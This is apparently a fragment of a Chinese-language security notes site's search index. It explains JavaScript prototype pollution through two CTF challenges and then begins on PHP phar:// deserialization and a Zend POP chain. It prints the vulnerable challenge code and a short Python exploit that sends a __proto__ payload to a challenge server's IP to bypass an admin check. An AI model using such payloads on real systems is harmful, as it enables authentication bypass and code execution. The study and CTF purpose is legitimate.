\u800c\u7ecf\u8fc7\u4e0d\u65ad\u7684\u8c03\u7528,\u6700\u7ec8\u7684\u539f\u578b\u5bf9\u8c61\u4f1a\u8c03\u7528\u5230null,\u8fd9\u5c06\u4f5c\u4e3a\u8be5\u539f\u578b\u94fe\u7684\u6700\u540e\u4e00\u4e2a\u73af\u8282,\u4e0e\u4e4b\u5bf9\u5e94\u7684,\u4f5c\u4e3a\u7ec8\u70b9\u7684null\u81ea\u7136\u4e5f\u662f\u6ca1\u6709\u539f\u578b\u5bf9\u8c61\u7684\u3002\u6bd4\u5982,\u6211\u4eec\u7ee7\u7eed\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u8c03\u7528\u5176\u539f\u578b\u5bf9\u8c61: obj. proto . proto ; <\u00b7 null \u5728Javascript\u4e2d\u53ef\u4ee5\u901a\u8fc7example.a.b\u6216example.a[\"b\"]\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u8bbf\u95ee,example.a\u8bbf\u95ee\u7684\u662fexample\u5bf9\u8c61\u4e0b\u7684a\u5bf9\u8c61\u7684b,\u800cexample.a[\"b\"]\u5219\u662f\u8bbf\u95eeexample\u5bf9\u8c61\u4e0b\u7684a\u6570\u7ec4\u7684\u4e0b\u6807\u4e3ab\u7684\u503c\u3002 \u7531\u4e8e\u5bf9\u8c61\u662f\u65e0\u5e8f\u7684,\u5f53\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u8bbf\u95ee\u5bf9\u8c61\u65f6,\u53ea\u80fd\u4f7f\u7528\u6307\u660e\u4e0b\u6807\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u3002 \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7a[\" proto \"]\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u5176\u539f\u578b\u5bf9\u8c61\u3002","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_2","text":"","title":"\u5b9e\u4f8b"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#hackit-2018","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 const express = require ( 'express' ) var hbs = require ( 'hbs' ); var bodyParser = require ( 'body-parser' ); const md5 = require ( 'md5' ); var morganBody = require ( 'morgan-body' ); const app = express (); var user = []; //empty for now var matrix = []; for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } function draw ( mat ) { var count = 0 ; for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( matrix [ i ][ j ] !== null ){ count += 1 ; } } } return count === 9 ; } app . use ( '/static' , express . static ( 'static' )); app . use ( bodyParser . json ()); app . set ( 'view engine' , 'html' ); morganBody ( app ); app . engine ( 'html' , require ( 'hbs' ). __express ); app . get ( '/' , ( req , res ) => { for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } res . render ( 'index' ); }) app . get ( '/admin' , ( req , res ) => { /*this is under development I guess ??*/ if ( user . admintoken && req . query . querytoken && md5 ( user . admintoken ) === req . query . querytoken ){ res . send ( 'Hey admin your flag is <b>flag{prototype_pollution_is_very_dangerous}</b>' ); } else { res . status ( 403 ). send ( 'Forbidden' ); } } ) app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; console . log ( matrix ); for ( var i = 0 ; i < 3 ; i ++ ){ if ( matrix [ i ][ 0 ] === matrix [ i ][ 1 ] && matrix [ i ][ 1 ] === matrix [ i ][ 2 ] ){ if ( matrix [ i ][ 0 ] === 'X' ) { winner = 1 ; } else if ( matrix [ i ][ 0 ] === 'O' ) { winner = 2 ; } } if ( matrix [ 0 ][ i ] === matrix [ 1 ][ i ] && matrix [ 1 ][ i ] === matrix [ 2 ][ i ]){ if ( matrix [ 0 ][ i ] === 'X' ) { winner = 1 ; } else if ( matrix [ 0 ][ i ] === 'O' ) { winner = 2 ; } } } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'O' ){ winner = 2 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'O' ){ winner = 2 ; } if ( draw ( matrix ) && winner === null ){ res . send ( JSON . stringify ({ winner : 0 })) } else if ( winner !== null ) { res . send ( JSON . stringify ({ winner : winner })) } else { res . send ( JSON . stringify ({ winner : - 1 })) } }) app . listen ( 3000 , () => { console . log ( 'app listening on port 3000!' ) }) \u6f0f\u6d1e\u5173\u952e\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; \u800cdata\u662f\u4ece\u7f51\u9875\u4f20\u9012\u7684\u53c2\u6570,\u5f62\u5982: {\"row\":1,\"col\":\"1\",\"data\":\"X\"} \u5bf9\u5e94\u7684row\u4ee5\u53cacol\u503c\u4f1a\u5b58\u653e\u81f3matrix\u4e2d,\u800c\u8fd9\u91cc\u5219\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9690\u60a3\u3002 \u56de\u5230\u9898\u76ee\u672c\u8eab\u7684\u903b\u8f91\u4e2d,\u83b7\u5f97Flag\u7684\u8981\u6c42\u4e3a: \u4f20\u5165\u7684querytoken\u4e0euser.admintoken\u7684md5\u54c8\u5e0c\u503c\u4e00\u6837 \u4e00\u4e2a\u7b80\u8981\u7684\u539f\u578b\u94fe\u6c61\u67d3\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 > a=[]; <\u00b7 [] > b=[]; <\u00b7 [] > b[\"__proto__\"]; <\u00b7 [constructor: \u0192, concat: \u0192, find: \u0192, findIndex: \u0192, pop: \u0192, \u2026] > b[\"__proto__\"][\"admintoken\"]=\"ccda\"; <\u00b7 \"ccda\" > a <\u00b7 [] > a.admintoken <\u00b7 \"ccda\" \u53c2\u8003wp\u5f97\u5230\u4e00\u4e2aexp\u5982\u4e0b\uff1a 1 2 3 4 5 6 import requests r = requests . post ( 'http://185.168.131.1:3000/api' , json = { 'row' : '__proto__' , 'col' : 'admintoken' , 'data' : 'qqq' }) r = requests . get ( 'http://185.168.131.1:3000/admin?querytoken=' + md5sumhex ( 'qqq' )) print r . text \u90a3\u4e48 matrix[__proto__][admintoken]=qqq \u8fd9\u5c31\u8db3\u4ee5\u8fbe\u5230\u76ee\u7684\u4e86 GitHub\u4e0a\u4e00\u4e2a\u7528\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9879\u76ee https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md","title":"Hackit 2018"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#p","text":"JavaScript\u4e2d\uff0c\u6211\u4eec\u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u9700\u8981\u4ee5\u5b9a\u4e49\u201c\u6784\u9020\u51fd\u6570\u201d\u7684\u65b9\u5f0f\u6765\u5b9a\u4e49\uff1a 1 2 3 4 5 function Foo () { this . bar = 1 } new Foo () Foo\u51fd\u6570\u7684\u5185\u5bb9\uff0c\u5c31\u662fFoo\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u800cthis.bar\u5c31\u662fFoo\u7c7b\u7684\u4e00\u4e2a\u5c5e\u6027\u3002 \u5c1d\u8bd5\u5982\u4e0b\u4ee3\u7801\uff0c foo \u662f object \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u901a\u8fc7 foo.__proto__ \u4fee\u6539\u4e86 object \u7c7b\u7684\u5c5e\u6027","title":"\u6765\u81eap\u725b\u7684\u6587\u7ae0"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_3","text":"\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u54ea\u4e9b\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e __proto__ \u7684\u503c\u5462\uff1f\u5176\u5b9e\u627e\u627e\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u5bf9\u8c61\uff09\u7684\u201c\u952e\u540d\u201d\u7684\u64cd\u4f5c\u5373\u53ef\uff1a \u5bf9\u8c61merge \u5bf9\u8c61clone\uff08\u5176\u5b9e\u5185\u6838\u5c31\u662f\u5c06\u5f85\u64cd\u4f5c\u7684\u5bf9\u8c61merge\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u4e2d\uff09","title":"\u54ea\u4e9b\u60c5\u51b5\u4f1a\u88ab\u6c61\u67d3"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_4","text":"b \u5728\u5b9e\u4f8b\u5316\u4e3a test\u5bf9\u8c61 \u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f93\u51fatest\u7c7b\u4e2d\u7684 \u5c5e\u6027a \u4e86 \u5728javascript\u4e2d,\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u76f4\u5230null\u4e3a\u6b62 1 2 3 4 function i (){ this . a = \"test1\" ; this . b = \"test2\" ; } i \u7684\u7236\u7c7b\u4e3aobject\uff0c\u4e14\u91cc\u9762\u8fd8\u6709\u8bb8\u591a\u51fd\u6570\uff0c\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u8bb8\u591a\u53d8\u91cf\u53ef\u4ee5\u8c03\u7528\u67d0\u4e9b\u65b9\u6cd5\u3002 \u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\u3002\u540c\u65f6\uff0c\u5728js\u4e2d\u53ea\u6709\u7c7b\u624d\u6709prototype\u5c5e\u6027\uff0c\u800c\u5bf9\u8c61\u5374\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f __proto__ \u548c\u7c7b\u7684 prototype \u5bf9\u5e94\u3002\u4e14\u4e8c\u8005\u662f\u7b49\u4ef7\u7684","title":"\u5b89\u5168\u5ba2\u7684\u6458\u5f55"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_5","text":"\u539f\u578b\u94fe\u4e3a b -> a.prototype -> object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u7c7b\u65f6"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_6","text":"c -> array.prototype -> object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\u65f6"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_7","text":"\u539f\u578b\u94fe\u4e3a\uff1a d -> function.prototype -> object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u65f6"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_8","text":"f -> Data.prototype -> object.prototype->null \u5f97\u51fa\uff1a javascript \u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u4e00\u5207\u7686\u59cb\u4e8e object.prototype","title":"\u521b\u5efa\u4e00\u4e2a\u65e5\u671f"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_9","text":"\u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined j -> i.prototype -> object.prototype -> null","title":"\u641c\u7d22\u7684\u8fc7\u7a0b"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_10","text":"mess.js \u6587\u4ef6 1 2 3 4 5 ( function () { var secret = [ \"aaa\" , \"bbb\" ]; secret . forEach (); })(); attach.html \u7ed3\u679c\u5982\u4e0b\uff1a mess.js\u4e2d\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u6570\u7ec4 secret ,\u7136\u540e\u8be5\u6570\u7ec4\u8c03\u7528\u4e86\u5c5e\u4e8e Array.protottype \u7684 foreach \u65b9\u6cd5,\u5982\u4e0b \u5728\u8c03\u7528js\u6587\u4ef6\u4e4b\u524d\uff0cjs\u4ee3\u7801\u4e2d\u5c06 Array.prototype.foreach \u65b9\u6cd5\u8fdb\u884c\u4e86\u91cd\u5199\uff0c\u800cprototype\u94fe\u4e3a secret -> Array.prototype ->object.prototype ,secret\u4e2d\u65e0 foreach \u65b9\u6cd5\uff0c\u6240\u4ee5\u5c31\u4f1a\u5411\u4e0a\u68c0\u7d22\uff0c\u5c31\u627e\u5230\u4e86 Array.prototype \u800c\u5176 foreach \u65b9\u6cd5\u5df2\u7ecf\u88ab\u91cd\u5199\u8fc7\u4e86\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u8f93\u51fa\u3002 \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u6c61\u67d3\u3002\u5f88\u660e\u663e\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a \u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c \u2014\u2014__proto__ \u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86 \u770b\u4e00\u9053\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 'use strict' ; const express = require ( 'express' ); const bodyParser = require ( 'body-parser' ) const cookieParser = require ( 'cookie-parser' ); const path = require ( 'path' ); const isObject = obj => obj && obj . constructor && obj . constructor === Object ; function merge ( a , b ) { for ( var attr in b ) { if ( isObject ( a [ attr ]) && isObject ( b [ attr ])) { merge ( a [ attr ], b [ attr ]); } else { a [ attr ] = b [ attr ]; } } return a } function clone ( a ) { return merge ({}, a ); } // Constants const PORT = 8080 ; const HOST = '0.0.0.0' ; const admin = {}; // App const app = express (); app . use ( bodyParser . json ()) app . use ( cookieParser ()); app . use ( '/' , express . static ( path . join ( __dirname , 'views' ))); app . post ( '/signup' , ( req , res ) => { var body = JSON . parse ( JSON . stringify ( req . body )); var copybody = clone ( body ) if ( copybody . name ) { res . cookie ( 'name' , copybody . name ). json ({ \"done\" : \"cookie set\" }); } else { res . json ({ \"error\" : \"cookie not set\" }) } }); app . get ( '/getFlag' , ( req , res ) => { var \u0430dmin = JSON . parse ( JSON . stringify ( req . cookies )) if ( admin . \u0430dmin == 1 ) { res . send ( \"hackim19{}\" ); } else { res . send ( \"You are not authorized\" ); } }); app . listen ( PORT , HOST ); console . log ( `Running on http:// ${ HOST } : ${ PORT } ` ); \u672c\u5730\u6d4b\u8bd5\uff1a \u672a\u6210\u529f \u4eec\u5728\u521b\u5efa\u5b57\u5178\u7684\u65f6\u5019\uff0c __proto__ ,\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u952e\u540d\uff0c\u800c\u662f\u5df2\u7ecf\u4f5c\u4e3a __proto__ \u7ed9\u5176\u7236\u7c7b\u8fdb\u884c\u8d4b\u503c\u4e86\uff0c\u6240\u4ee5\u5728 test.__proto__ \u4e2d\u624d\u6709admin\u5c5e\u6027\uff0c\u4f46\u662f\u6211\u4eec\u662f\u60f3\u8ba9 __proto__ \u4f5c\u4e3a\u4e00\u4e2a\u952e\u503c\u7684. \u4f7f\u7528JSON.parse JSON.parse \u4f1a\u628a\u4e00\u4e2ajson\u5b57\u7b26\u4e32 \u8f6c\u5316\u4e3a javascript\u7684object","title":"\u4e3e\u4f8b"},{"location":"audit/\u539f\u578b\u94fe\u6c61\u67d3/#_11","text":"https://xz.aliyun.com/t/2735 https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming https://www.anquanke.com/post/id/176884 \u6df1\u5165\u7406\u89e3JavaScript prototype\u6c61\u67d3\u653b\u51fb \u7ffb\u8bd1JavaScript\u539f\u578b\u94fe\u6c61\u67d3 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"\u53c2\u8003"},{"location":"audit/\u53cd\u5e8f\u5217\u5316/","text":"\u53cd\u5e8f\u5217\u5316 \u00b6 \u81ea\u4ece Orange \u5728 2017\u5e74\u7684 hitcon \u51fa\u4e86\u4e00\u4e2a 0day \u7684 php phar:// \u53cd\u5e8f\u5217\u5316\u7ed9\u6574\u4e2a\u5b89\u5168\u754c\u5f00\u542f\u4e86\u65b0\u4e16\u754c\u7684\u5927\u95e8\u4ee5\u540e\uff0cphp \u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u6f0f\u6d1e\u5c31\u9010\u6e10\u5347\u6e29\uff0c\u6ca1\u60f3\u5230\u540e\u6765 2018 \u5e74 blackhat \u7684\u8bae\u9898\u4e0a\u8fd9\u4e2a\u95ee\u9898\u518d\u6b21\u88ab\u63d0\u53ca\uff0c\u5229\u7528\u7684\u8fd8\u662f Orange \u7684\u601d\u8def(\u6211\u53ea\u80fd orz),\u5230\u73b0\u5728 phar:// \u53cd\u5e8f\u5217\u5316\u5df2\u7ecf\u6210\u4e3a\u4e86\u5404\u5927 CTF \u7099\u624b\u53ef\u70ed\u7684\u601d\u8def\uff0c\u5c31\u4eff\u4f5b 2016 \u5e74\u7684 CVE-2016-7124 \u7ed5\u8fc7 __weakup \u4e00\u6837\uff0c\u4e8e\u662f\u6211\u4e5f\u628a\u8fd9\u7bc7\u6587\u7ae0\u63d0\u4e0a\u65e5\u7a0b\uff0c\u5e0c\u671b\u80fd\u5728\u5bf9\u6574\u4e2a PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5256\u6790\u8fc7\u7a0b\u4e2d\u5bf9\u5176\u6709\u66f4\u6df1\u5165\u7684\u7406\u89e3\uff0c\u4e5f\u5e0c\u671b\u8bfb\u8005\u5728\u8bfb\u6211\u7684\u6587\u7ae0\u4e2d\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u548c\u6536\u83b7(\u5982\u679c\u771f\u7684\u662f\u8fd9\u6837\uff0c\u8fd9\u5c06\u662f\u6211\u83ab\u5927\u7684\u8363\u5e78) \u4ecejason\u5f00\u59cb\u7c7b\u6bd4 \u00b6 POP\u94fe\u5b9e\u6218 \u00b6 \u6574\u4e2a\u4ee3\u7801\u7247\u6bb5\u6211\u5c06\u4ee5\u56fe\u7247\u7684\u5f62\u5f0f\u5c55\u73b0\uff0c\u6709\u5174\u8da3\u7684\u8bfb\u8005\u8bf7\u5148\u81ea\u5df1\u5206\u6790\uff0c\u4e4b\u540e\u5728\u770b\u6211\u7684\u5206\u6790\uff0c \u5f53\u7136\u8fd9\u4e2a\u6848\u4f8b\u91cc\u9762\u4f3c\u4e4e\u5c11\u4e86\u6bd4\u8f83\u5173\u952e\u7684 unserialize() \u51fd\u6570\uff0c\u90a3\u6211\u4eec\u5c31\u5047\u8bbe\u8fd9\u4e2a unserialize() \u5728\u6211\u4eec\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u91cc\u9762\uff0c\u5e76\u4e14\u53c2\u6570\u5b8c\u5168\u53ef\u63a7 \u5982\u4e0b\u8fd9\u4e2a\u7c7b\u4e2d\u6709\u4e00\u4e2a __destruct \u65b9\u6cd5\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u63a7\u5236 $_writers \u8c03\u7528 shutdown \u65b9\u6cd5 Zend_Log_Writer_Mail \u7c7b\u4e2d\u6709\u4e00\u4e2a shutdown \u65b9\u6cd5\u53ef\u4ee5\u5c1d\u8bd5\uff0c\u6211\u4eec\u770b\u5230\u8fd9\u4e2a\u7c7b\u91cc\u9762\u4f7f\u7528\u4e86 $write \u5bf9\u8c61\u7684\u5f88\u591a\u5c5e\u6027\uff0c\u6bd4\u5982\u8bf4 _layout \uff0c\u7136\u540e\u6211\u4eec\u53c8\u53d1\u73b0\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u8c03\u7528\u4e86\u4e00\u4e2a\u65b9\u6cd5 render() \uff0c\u8bf4\u660e\u8fd9\u4e2a\u5c5e\u6027\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e8e\u662f\u6211\u4eec\u8fd8\u8981\u5411\u66f4\u6df1\u5904\u6316\u6398 _layout \u662f\u8c01\u7684\u5bf9\u8c61\u5462\uff1f\u6211\u4eec\u53d1\u73b0\u4ed6\u662f Zend_layout \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540c\u6837\u7684\uff0c\u4ed6\u91cc\u9762\u662f\u7528\u4e86\u4e00\u4e2a _inflector \u7684\u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8c03\u7528\u4e86 filter \u65b9\u6cd5\uff0c\u770b\u6765\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61 \u6211\u4eec\u53d1\u73b0 _inflector \u662f Zend_Filter_PregReplace \u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u4e00\u4e9b\u5c5e\u6027\u662f\u80fd\u8fdb\u884c\u76f4\u63a5\u63a7\u5236\u7684\uff0c\u5e76\u4e14\u5728\u8c03\u7528 filter \u65b9\u6cd5\u7684\u65f6\u5019\u80fd\u76f4\u63a5\u89e6\u53d1 preg_replace() \u65b9\u6cd5\uff0c\u592a\u597d\u4e86\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u6211\u4eec\u53ea\u8981\u63a7\u5236\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u5229\u7528\u94fe \u6240\u4ee5\u6574\u4e2a POP \u94fe\u5c31\u662f 1 writer->shutdown()->render()->filter()->preg_replace(\u6211\u4eec\u63a7\u5236\u7684\u5c5e\u6027)->\u4ee3\u7801\u6267\u884c \u5229\u7528 phar:// \u62d3\u5c55 PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762 \u00b6 1.\u56de\u987e\u4e00\u4e0b\u539f\u5148 PHP \u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u5fc5\u8981\u6761\u4ef6 \u00b6 (1)\u9996\u5148\u6211\u4eec\u5fc5\u987b\u6709 unserailize() \u51fd\u6570 (2)unserailize() \u51fd\u6570\u7684\u53c2\u6570\u5fc5\u987b\u53ef\u63a7 \u8fd9\u4e24\u4e2a\u662f\u539f\u5148\u5b58\u5728 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5fc5\u8981\u6761\u4ef6\uff0c\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6761\u4ef6\u4f60\u8c08\u90fd\u4e0d\u8981\u8c08\uff0c\u6839\u672c\u4e0d\u53ef\u80fd\uff0c\u4f46\u662f\u4ece2017 \u5e74\u5f00\u59cb Orange \u544a\u8bc9\u6211\u4eec\u662f\u53ef\u4ee5\u7684 2.phar:// \u5982\u4f55\u6269\u5c55\u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u9762\u7684 \u00b6 \u539f\u6765 phar \u6587\u4ef6\u5305\u5728 \u751f\u6210\u65f6\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u914d\u5408 phar:// \u6211\u4eec\u5c31\u80fd\u5728\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 file_exists() is_dir() \u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u6784\u9020\u7cbe\u5fc3\u8bbe\u8ba1\u7684 phar \u5305\u5728\u6ca1\u6709 unserailize() \u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5c06 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u89e6\u53d1\u6761\u4ef6\u5927\u5927\u62d3\u5bbd\u4e86\uff0c\u964d\u4f4e\u4e86\u6211\u4eec PHP \u53cd\u5e8f\u5217\u5316\u7684\u653b\u51fb\u8d77\u70b9\u3002 3.\u5177\u4f53\u89e3\u91ca\u4e00\u4e0b phar \u7684\u4f7f\u7528 \u00b6 1.Phar \u7684\u6587\u4ef6\u7ed3\u6784 \u00b6 phar \u6587\u4ef6\u6700\u6838\u5fc3\u4e5f\u662f\u5fc5\u987b\u8981\u6709\u7684\u90e8\u5206\u5982\u56fe\u6240\u793a\uff1a (1) a stub \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2aPHP \u6587\u4ef6\u5b9e\u9645\u4e0a\u6211\u4eec\u80fd\u5c06\u5176\u7b80\u5316\u4e3a\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50 \u683c\u5f0f\u4e3a: 1 xxx<?php xxx; __HALT_COMPILER();?> \u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u8fd9\u90e8\u5206\u7684\u76ee\u7684\u5c31\u662f\u8ba9 phar \u6269\u5c55\u8bc6\u522b\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u7684 phar \u6587\u4ef6 (2\uff09a manifest describing the contents \u56e0\u4e3a Phar \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u5b83\u91cc\u9762\u5b58\u50a8\u7740\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684 meta-data \uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 (3)the file contents \u8fd9\u90e8\u5206\u5c31\u662f\u6211\u4eec\u60f3\u8981\u538b\u7f29\u5728 phar \u538b\u7f29\u5305\u5185\u90e8\u7684\u6587\u4ef6 2.\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5408\u6cd5\u7684 Phar\u538b\u7f29\u6587\u4ef6 \u00b6 \u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( 